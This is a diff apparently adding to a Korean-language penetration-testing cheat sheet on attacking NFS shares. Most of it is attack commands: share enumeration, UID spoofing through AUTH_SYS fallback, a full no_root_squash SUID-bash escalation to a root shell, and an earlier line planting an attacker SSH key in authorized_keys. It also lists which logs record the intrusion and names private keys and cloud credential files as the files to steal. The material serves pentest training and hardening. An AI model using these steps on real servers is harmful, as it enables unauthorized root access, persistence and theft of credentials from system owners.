@@ -89,3 +89,78 @@ echo "ATTACKER_PUBKEY" >> /tmp/nfs/home/user/.ssh/authorized_keys
 ```bash
 nmap --script=nfs-ls,nfs-showmount,nfs-statfs -p 2049 TARGET
 ```
+
+---
+
+## enum4linux-ng / nmap 자동 열거
+
+```bash
+# enum4linux-ng 는 NFS 섹션 포함
+enum4linux-ng -A TARGET
+
+# showmount 가 막혔을 때 포트 111(portmapper) 로 우회 조회
+rpcinfo -p TARGET
+rpcinfo -s TARGET | grep nfs
+```
+
+---
+
+## NFSv4 / Kerberos
+
+NFSv4 는 포트 111(portmapper) 없이 2049 하나로 동작하고 Kerberos(`krb5`, `krb5i`, `krb5p`) 인증을 지원한다.
+
+```bash
+# NFSv4 마운트 (pseudo-root)
+mount -t nfs4 TARGET:/ /tmp/nfs4
+
+# Kerberos 인증
+kinit user@DOMAIN.LOCAL
+mount -t nfs4 -o sec=krb5 TARGET:/share /tmp/nfs4
+
+# 익명 접근이 막혀도 AUTH_SYS 폴백이 허용되면 UID 스푸핑 가능
+mount -t nfs -o vers=3,sec=sys TARGET:/share /tmp/nfs
+```
+
+---
+
+## 일반적인 Exports 오설정
+
+`/etc/exports` 에서 자주 보이는 취약 패턴:
+
+```text
+/share        *(rw,no_root_squash)        # 가장 치명적 - root 로 읽기/쓰기
+/home         *(rw,no_root_squash,insecure)
+/backup       *(rw,all_squash,anonuid=0)  # 익명이 root 로 매핑됨
+/data         192.168.0.0/16(rw)          # 내부 전체 허용 - 피봇 후 접근 가능
+```
+
+### no_root_squash 권한 상승 (전체 흐름)
+
+```bash
+# 공격자 (NFS 클라이언트, root)
+mount -t nfs TARGET:/share /mnt/nfs
+cp /bin/bash /mnt/nfs/pwn
+chmod +s /mnt/nfs/pwn                     # SUID 비트 설정
+
+# 타겟 (NFS 서버 쉘, 일반 사용자)
+/share/pwn -p
+# → euid=0(root) 쉘
+```
+
+### root_squash 우회 (all_squash + anonuid=0)
+
+```bash
+# anonuid=0 이면 익명 접근도 root 로 매핑되어 동일하게 SUID 기법 사용 가능
+mount -t nfs TARGET:/share /mnt/nfs
+cp /bin/bash /mnt/nfs/pwn && chmod +s /mnt/nfs/pwn
+```
+
+---
+
+## 유의사항
+
+!!! warning "로그"
+    NFS 서버는 `rpc.mountd`, `rpc.nfsd` 로그를 남긴다. `/var/log/messages`, `journalctl -u nfs-server` 에 클라이언트 IP / 마운트 기록이 찍힘.
+
+!!! tip "쓰기 권한 없이도 공격 가능"
+    읽기 전용이어도 `.ssh/id_rsa`, `.bash_history`, `.aws/credentials` 등 자격 증명 파일 유출이 주목표.
